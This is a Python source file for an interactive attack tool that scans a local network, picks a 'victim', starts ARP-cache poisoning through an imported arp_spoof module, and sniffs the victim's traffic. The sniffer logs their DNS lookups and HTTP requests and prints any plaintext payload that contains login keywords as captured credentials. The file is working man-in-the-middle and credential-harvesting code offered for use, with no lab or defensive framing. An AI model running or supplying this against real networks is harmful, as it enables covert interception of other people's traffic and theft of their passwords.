import time
import os
import socket
import ipaddress
import threading
import shutil
import subprocess
from colorama import Fore, Style, init as colorama_init
import psutil

# Initialize colorama for Windows support
colorama_init(autoreset=False)

# Try to import scapy, offer installation if missing
try:
    from scapy.all import (sniff as scapy_sniff, srp, ARP, Ether, Raw, conf,
                            DNS, DNSQR, IP, TCP, UDP, sendp)
    from scapy.layers import http
except ImportError:
    def offer_install_scapy() -> None:
        """Prompt the user to install Scapy via apt or pip when missing."""
        print(f"{Fore.YELLOW}[!] Scapy is not installed.{Style.RESET_ALL}")
        apt_path = shutil.which('apt')
        pip_path = shutil.which('pip') or shutil.which('pip3')

        if apt_path and os.name != 'nt':
            answer = input("[*] Install Scapy now using 'sudo apt install scapy'? (Y/N): ").strip().lower()
            if answer == 'y':
                try:
                    subprocess.run(['sudo', 'apt', 'update'], check=True)
                    subprocess.run(['sudo', 'apt', 'install', '-y', 'scapy'], check=True)
                except subprocess.CalledProcessError as e:
                    print(f"{Fore.RED}[!] apt install failed: {e}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN}[+] scapy installed via apt. Please re-run this tool.{Style.RESET_ALL}")
                    return
        if pip_path:
            answer = input("[*] Install Scapy now using 'pip install scapy'? (Y/N): ").strip().lower()
            if answer == 'y':
                try:
                    subprocess.run([pip_path, 'install', 'scapy'], check=True)
                except subprocess.CalledProcessError as e:
                    print(f"{Fore.RED}[!] pip install failed: {e}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN}[+] scapy installed via pip. Please re-run this tool.{Style.RESET_ALL}")
                    return

        print(f"{Fore.YELLOW}[!] Scapy is required to run the network scanner/sniffer. Install it and re-run the tool.{Style.RESET_ALL}")

    offer_install_scapy()
    raise SystemExit(1)

from prettytable import PrettyTable

# Import ARP spoof module
from arp_spoof import main_arp_spoof, stop_arp_spoof_background, is_arp_spoof_active

# Last scanned / selected victim IP (set when scanner stops and user enters a value)
last_victim_ip: str | None = None
last_interface: str | None = None

# Warn if Scapy's pcap provider is not available
try:
    if not conf.use_pcap:
        print(f"{Fore.YELLOW}[!] No libpcap provider detected. Install Npcap (Windows) or libpcap (Linux) for best results.{Style.RESET_ALL}")
except Exception:
    pass


# ---------------------------------------------------------------------------
# Logging helpers — consistent with arp_spoof.py
# ---------------------------------------------------------------------------

def _info(msg: str) -> None:
    print(f"{Fore.BLUE}[*]{Style.RESET_ALL} {msg}")

def _ok(msg: str) -> None:
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")

def _warn(msg: str) -> None:
    print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")

def _err(msg: str) -> None:
    print(f"{Fore.RED}[!]{Style.RESET_ALL} {msg}")


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def get_current_mac(interface: str) -> str | None:
    """Return the MAC address for *interface*, or None if not found."""
    try:
        addrs = psutil.net_if_addrs()
        if interface in addrs:
            for addr in addrs[interface]:
                if addr.family == psutil.AF_LINK:
                    return addr.address
    except Exception as e:
        _err(f"Could not get MAC for {interface}: {e}")
    return None


def get_current_ip(interface: str) -> str | None:
    """Return the IPv4 address for *interface*, or None if not found."""
    try:
        addrs = psutil.net_if_addrs()
        if interface in addrs:
            for addr in addrs[interface]:
                if addr.family == socket.AF_INET:
                    return addr.address
    except Exception as e:
        _err(f"Could not get IP for {interface}: {e}")
    return None


def get_interface_network(interface: str) -> tuple[str, str] | None:
    """Return (ip, netmask) for *interface*, or None if unavailable."""
    try:
        addrs = psutil.net_if_addrs()
        if interface in addrs:
            for addr in addrs[interface]:
                if addr.family == socket.AF_INET:
                    return addr.address, addr.netmask
    except Exception as e:
        _err(f"Could not get network for {interface}: {e}")
    return None


def check_privileges() -> bool:
    """Return True if running with sufficient privileges for raw sockets.

    On Unix this means uid 0. On Windows, return True (Npcap handles it).
    """
    if os.name == 'nt':
        return True
    try:
        return os.geteuid() == 0
    except AttributeError:
        return True


# ---------------------------------------------------------------------------
# Network scanning
# ---------------------------------------------------------------------------

def scan_network_once(interface: str) -> set[tuple[str, str]] | None:
    """Run a single ARP scan on *interface* and return discovered devices.

    Returns a set of (ip, mac) tuples, or None on failure.
    """
    net = get_interface_network(interface)
    if not net:
        _err(f"Could not determine network for {interface}")
        return None
    ip, netmask = net
    try:
        network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
    except Exception as e:
        _err(f"Invalid network for {interface}: {e}")
        return None

    subnet = str(network)
    _info(f"Scanning {subnet} on {interface}...")

    arp = ARP(pdst=subnet)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    try:
        answered, _ = srp(packet, iface=interface, timeout=2, verbose=False)
    except PermissionError:
        _err("Permission denied — run as root or with Npcap on Windows")
        return None
    except Exception as e:
        _err(f"ARP scan failed: {e}")
        return None

    devices: set[tuple[str, str]] = set()
    for sent, received in answered:
        devices.add((received.psrc, received.hwsrc))

    return devices


def ip_table() -> None:
    """Print a table of all network interfaces with their MAC and IP."""
    addrs = psutil.net_if_addrs()
    netmasks = {}
    for interface in addrs:
        for addr in addrs[interface]:
            if addr.family == socket.AF_INET:
                netmasks[interface] = addr.netmask

    t = PrettyTable([
        f'{Fore.GREEN}Interface',
        'MAC Address',
        f'IP Address{Style.RESET_ALL}'
    ])
    for interface in addrs:
        mac = get_current_mac(interface)
        ip = get_current_ip(interface)
        if ip and mac:
            t.add_row([interface, mac, ip])
        elif mac:
            t.add_row([interface, mac, f"{Fore.YELLOW}No IP assigned{Style.RESET_ALL}"])
        elif ip:
            t.add_row([interface, f"{Fore.YELLOW}No MAC assigned{Style.RESET_ALL}", ip])
    print(t)


def choose_interface() -> str | None:
    """Present a numbered list of interfaces and return the selected name."""
    addrs = psutil.net_if_addrs()
    interfaces = list(addrs.keys())
    if not interfaces:
        _err("No network interfaces found")
        return None

    print(f"\n{Fore.CYAN}Available interfaces:{Style.RESET_ALL}")
    for idx, iface in enumerate(interfaces, start=1):
        ip = get_current_ip(iface) or "-"
        mac = get_current_mac(iface) or "-"
        print(f"  {Fore.GREEN}{idx}{Style.RESET_ALL}) {iface}  IP: {ip}  MAC: {mac}")

    try:
        choice = input(f"\n{Fore.BLUE}[*]{Style.RESET_ALL} Select interface by number: ").strip()
        if not choice:
            return None
        i = int(choice) - 1
        if 0 <= i < len(interfaces):
            return interfaces[i]
        _err("Invalid selection.")
    except (ValueError, KeyboardInterrupt):
        _err("Invalid selection or cancelled.")
    return None


# ---------------------------------------------------------------------------
# Packet sniffing
# ---------------------------------------------------------------------------

def sniff(interface: str, show_raw: bool, victim_ip: str | None = None) -> None:
    """Start sniffing on *interface*. Optionally filter to *victim_ip* only."""
    bpf_filter = f"host {victim_ip}" if victim_ip else None
    sniff_kwargs: dict = dict(
        iface=interface,
        store=False,
        prn=lambda pkt: process_sniffed_packet(pkt, show_raw),
    )
    if bpf_filter:
        sniff_kwargs["filter"] = bpf_filter
    scapy_sniff(**sniff_kwargs)


def process_sniffed_packet(packet, show_raw: bool) -> None:
    """Callback invoked for every captured packet."""
    # --- DNS queries ---
    if packet.haslayer(DNS) and packet.haslayer(DNSQR):
        dns_layer = packet[DNS]
        if dns_layer.qr == 0:
            domain = packet[DNSQR].qname.decode(errors='ignore').rstrip('.')
            src = packet[IP].src if packet.haslayer(IP) else '?'
            print(f"{Fore.CYAN}[DNS] {src} -> {domain}{Style.RESET_ALL}")

    # --- HTTP requests ---
    if packet.haslayer(http.HTTPRequest):
        print(f"{Fore.BLUE}[+] HTTP REQUEST >>>>>{Style.RESET_ALL}")
        url_extractor(packet)
        login_data = get_login_info(packet)
        if login_data:
            print(
                f"{Fore.GREEN}[+] Credentials found >>> ",
                login_data,
                f"{Style.RESET_ALL}"
            )
        if show_raw:
            raw_http_request(packet)

    # --- TCP SYN (only when show_raw is enabled) ---
    elif show_raw and packet.haslayer(TCP):
        tcp = packet[TCP]
        if tcp.flags == 'S' and packet.haslayer(IP):
            src = packet[IP].src
            dst = packet[IP].dst
            dport = tcp.dport
            print(f"{Fore.YELLOW}[TCP] {src} -> {dst}:{dport} (SYN){Style.RESET_ALL}")


def get_login_info(packet) -> str | None:
    """Check the raw payload for common credential-related keywords."""
    if packet.haslayer(Raw):
        load = packet[Raw].load
        load_decode = load.decode('utf-8', errors='ignore')
        keywords = ["username", "user", "email", "pass", "login", "password",
                     "UserName", "Password"]
        for keyword in keywords:
            if keyword in load_decode:
                return load_decode
    return None


def url_extractor(packet) -> None:
    """Print the source IP, HTTP method, host and path from a packet."""
    http_layer = packet.getlayer('HTTPRequest').fields
    ip_layer = packet.getlayer('IP').fields
    print(
        f"  {ip_layer['src']} requested:\n"
        f"  {http_layer['Method'].decode()} "
        f"{http_layer['Host'].decode()}"
        f"{http_layer['Path'].decode()}"
    )


def raw_http_request(packet) -> None:
    """Pretty-print all fields from the HTTP request layer."""
    httplayer = packet[http.HTTPRequest].fields
    print("----------------- Raw HTTP Packet -------------------")
    print("{:<40} {:<15}".format('Key', 'Label'))
    try:
        for k, v in httplayer.items():
            label = "[binary]"
            try:
                label = v.decode()
            except (UnicodeDecodeError, AttributeError):
                pass
            print("{:<40} {:<15}".format(k, label))
    except KeyboardInterrupt:
        print("\n[+] Quitting...")
    print("-----------------------------------------------------")


# ---------------------------------------------------------------------------
# Packet Sniffer Module entry point
# ---------------------------------------------------------------------------

def main_sniff() -> None:
    """Run the packet-sniffer module."""
    global last_victim_ip, last_interface

    print(f"\n{Fore.CYAN}{'='*55}")
    print(f"         Packet Sniffer Module")
    print(f"{'='*55}{Style.RESET_ALL}")

    # Show ARP spoofing status
    if is_arp_spoof_active():
        _ok("ARP spoofing is active — traffic from victim is being captured.")
    else:
        _warn("ARP spoofing is NOT active. Only local traffic will be captured.")
        _info("Use option [1] to start ARP spoofing first for MITM captures.")

    print(f"{Fore.YELLOW}[!] DNS queries are captured (domains visited even over HTTPS)")
    print(f"[!] HTTP credentials are captured from plaintext traffic only{Style.RESET_ALL}")

    # --- Target IP filter ---
    victim_ip = last_victim_ip
    if victim_ip:
        _info(f"Last victim IP: {victim_ip}")
        override = input(f"{Fore.BLUE}[*]{Style.RESET_ALL} Press Enter to sniff {victim_ip}, or type a new IP: ").strip()
        if override:
            victim_ip = override
        else:
            _ok(f"Using victim IP: {victim_ip}")
    else:
        victim_ip_input = input(f"\n{Fore.BLUE}[*]{Style.RESET_ALL} Enter target IP to filter (blank = all traffic): ").strip()
        if victim_ip_input:
            victim_ip = victim_ip_input

    # --- Raw mode ---
    try:
        raw_input = input(f"{Fore.BLUE}[*]{Style.RESET_ALL} Show raw packets & TCP connections? (Y/N): ").strip()
        show_raw = raw_input.lower() == "y"

        # --- Interface ---
        ip_table()
        iface_input = input(f"\n{Fore.BLUE}[*]{Style.RESET_ALL} Enter interface name: ").strip()
        if not iface_input:
            _err("No interface provided.")
            return
        interface = iface_input

        # --- Start sniffing ---
        print(f"\n{Fore.CYAN}{'─'*55}")
        if victim_ip:
            print(f"   Sniffing packets for {Fore.GREEN}{victim_ip}{Fore.CYAN} only...")
        else:
            print(f"   Sniffing ALL packets (no filter)...")
        print(f"   Interface: {interface}")
        print(f"   Press Ctrl+C to stop sniffing")
        print(f"{'─'*55}{Style.RESET_ALL}\n")

        sniff(interface, show_raw, victim_ip)

    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Sniffing stopped.{Style.RESET_ALL}")
        time.sleep(1)


# ---------------------------------------------------------------------------
# Main Menu
# ---------------------------------------------------------------------------

MENU_BANNER = f"""
{Fore.CYAN}
  ███╗   ██╗███████╗████████╗    ███████╗███╗   ██╗██╗███████╗███████╗███████╗██████╗
  ████╗  ██║██╔════╝╚══██╔══╝    ██╔════╝████╗  ██║██║██╔════╝██╔════╝██╔════╝██╔══██╗
  ██╔██╗ ██║█████╗     ██║       ███████╗██╔██╗ ██║██║█████╗  █████╗  █████╗  ██████╔╝
  ██║╚██╗██║██╔══╝     ██║       ╚════██║██║╚██╗██║██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══██╗
  ██║ ╚████║███████╗   ██║       ███████║██║ ╚████║██║██║     ██║     ███████╗██║  ██║
  ╚═╝  ╚═══╝╚══════╝   ╚═╝       ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
{Style.RESET_ALL}"""


def print_menu() -> None:
    """Print the main menu options with ARP spoofing status."""
    print(f"\n{Fore.CYAN}{'='*55}{Style.RESET_ALL}")

    # Show ARP spoofing status in the menu header
    if is_arp_spoof_active():
        print(f"  {Fore.GREEN}[*] ARP Spoofing: ACTIVE{Style.RESET_ALL}")
    else:
        print(f"  {Fore.YELLOW}[*] ARP Spoofing: inactive{Style.RESET_ALL}")

    print(f"  {Fore.GREEN}[1]{Style.RESET_ALL}  Start ARP Spoofer  {Fore.YELLOW}(MITM — poison ARP caches){Style.RESET_ALL}")
    print(f"  {Fore.GREEN}[2]{Style.RESET_ALL}  Start Packet Sniffer {Fore.YELLOW}(capture HTTP credentials){Style.RESET_ALL}")
    print(f"  {Fore.GREEN}[3]{Style.RESET_ALL}  Stop ARP Spoofing   {Fore.YELLOW}(restore ARP tables){Style.RESET_ALL}")
    print(f"  {Fore.RED}[4]{Style.RESET_ALL}  Exit")
    print(f"{Fore.CYAN}{'='*55}{Style.RESET_ALL}")


def main() -> None:
    """Application entry point — show menu and dispatch to modules."""
    global last_victim_ip, last_interface

    print(MENU_BANNER)

    while True:
        print_menu()
        try:
            choice = input(f"\n{Fore.BLUE}[>]{Style.RESET_ALL} Select an option: ").strip()
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Exiting...{Style.RESET_ALL}")
            break

        # ------------------------------------------------------------------
        # Option 1: ARP Spoofing
        # ------------------------------------------------------------------
        if choice == "1":
            if is_arp_spoof_active():
                _warn("ARP spoofing is already running. Use [3] to stop it first.")
                continue

            if not check_privileges():
                _warn("You may need elevated privileges for ARP and raw sockets.")

            interface = choose_interface()
            if not interface:
                _err("No interface selected — returning to menu.")
                continue
            last_interface = interface

            # Single network scan
            _info(f"Scanning network on {interface}...")
            devices = scan_network_once(interface)
            devices_list: list[tuple[str, str]] = []
            if devices:
                devices_list = sorted(devices)
                _ok(f"Discovered {len(devices)} device(s):")
                t = PrettyTable(["#", "IP", "MAC Address"])
                for idx, (ip_addr, mac) in enumerate(devices_list, start=1):
                    t.add_row([idx, ip_addr, mac])
                print(t)
            else:
                _warn("No devices found on network.")
                retry = input(f"\n{Fore.BLUE}[*]{Style.RESET_ALL} Try again? (Y/N): ").strip().lower()
                if retry == 'y':
                    continue
                else:
                    _err("Cannot proceed without target.")
                    continue

            # --- Pick victim IP ---
            try:
                victim_input = input(f"\n{Fore.BLUE}[*]{Style.RESET_ALL} Enter Victim IP or # from table: ").strip()
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}[!] Cancelled.{Style.RESET_ALL}")
                continue

            victim_ip: str | None = None
            if victim_input.isdigit() and devices_list:
                idx = int(victim_input) - 1
                if 0 <= idx < len(devices_list):
                    victim_ip = devices_list[idx][0]
                    _ok(f"Selected victim: {victim_ip}")
            elif victim_input:
                victim_ip = victim_input

            if not victim_ip:
                _err("No victim IP selected — returning to menu.")
                continue

            last_victim_ip = victim_ip

            # --- Pick gateway IP ---
            try:
                gw_input = input(f"{Fore.BLUE}[*]{Style.RESET_ALL} Enter Gateway IP or # from table (blank = auto-detect): ").strip()
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}[!] Cancelled.{Style.RESET_ALL}")
                continue

            gateway_ip: str | None = None
            if gw_input.isdigit() and devices_list:
                idx = int(gw_input) - 1
                if 0 <= idx < len(devices_list):
                    gateway_ip = devices_list[idx][0]
            elif gw_input:
                gateway_ip = gw_input

            # --- Start ARP spoofing ---
            spoof_started = main_arp_spoof(target_ip=victim_ip, gateway_ip=gateway_ip)

            if not spoof_started:
                _err("ARP spoofing failed to start.")
                continue

        # ------------------------------------------------------------------
        # Option 2: Packet Sniffer
        # ------------------------------------------------------------------
        elif choice == "2":
            main_sniff()

        # ------------------------------------------------------------------
        # Option 3: Stop ARP Spoofing
        # ------------------------------------------------------------------
        elif choice == "3":
            if not is_arp_spoof_active():
                _warn("ARP spoofing is not currently running.")
                continue

            stop_arp_spoof_background()
            _ok("ARP spoofing has been stopped and ARP tables restored.")

        # ------------------------------------------------------------------
        # Option 4: Exit
        # ------------------------------------------------------------------
        elif choice == "4":
            if is_arp_spoof_active():
                _info("Stopping ARP spoofing before exit...")
                stop_arp_spoof_background()
            print(f"\n{Fore.RED}[!] Goodbye!{Style.RESET_ALL}")
            break

        else:
            _err("Invalid option. Please enter 1, 2, 3, or 4.")


if __name__ == "__main__":
    main()